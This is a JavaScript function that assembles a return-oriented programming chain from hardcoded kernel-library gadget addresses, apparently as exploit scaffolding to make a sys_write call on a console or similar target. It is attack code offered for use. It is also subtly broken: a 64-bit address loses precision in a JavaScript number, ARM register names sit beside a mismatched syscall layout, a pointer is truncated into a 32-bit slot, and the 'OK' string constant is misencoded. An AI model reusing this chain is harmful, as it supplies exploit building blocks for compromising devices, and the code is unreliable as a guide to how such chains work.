function setupROP() {
  ropChain = new Uint32Array(0x400);
  let i = 0;

  const LIBKERNEL_BASE = 0xFFFFFFFF82600000;

  const GADGET_POP_X0 = LIBKERNEL_BASE + 0x1A2FFC;
  const GADGET_POP_X1 = LIBKERNEL_BASE + 0x1A3020;
  const GADGET_POP_X2 = LIBKERNEL_BASE + 0x1A3040;
  const GADGET_POP_X3 = LIBKERNEL_BASE + 0x1A3060;
  const GADGET_SYSCALL = LIBKERNEL_BASE + 0x1A2F28;

  const SYSCALL_WRITE = 0x04;
  const FD_STDOUT = 1;
  const STR_PTR = 0x133713370300; // offset into the same buffer
  const STR_LEN = 3;

  // Step 1: syscall number (x0)
  ropChain[i++] = GADGET_POP_X0 & 0xFFFFFFFF;
  ropChain[i++] = SYSCALL_WRITE;

  // Step 2: fd (x1)
  ropChain[i++] = GADGET_POP_X1 & 0xFFFFFFFF;
  ropChain[i++] = FD_STDOUT;

  // Step 3: buf (x2)
  ropChain[i++] = GADGET_POP_X2 & 0xFFFFFFFF;
  ropChain[i++] = STR_PTR;

  // Step 4: len (x3)
  ropChain[i++] = GADGET_POP_X3 & 0xFFFFFFFF;
  ropChain[i++] = STR_LEN;

  // Step 5: syscall
  ropChain[i++] = GADGET_SYSCALL & 0xFFFFFFFF;

  // Step 6: string "OK\\n" at known offset
  const strOffset = 0x300 / 4; // 0x300 bytes → 0xC0 32-bit words
  ropChain[strOffset + 0] = 0x004B4F4F; // 'O''K' + null terminator
  ropChain[strOffset + 1] = 0x0000000A; // newline (0x0A)

  debug_log("ROP chain (sys_write) initialized.");
  return ropChain;
}
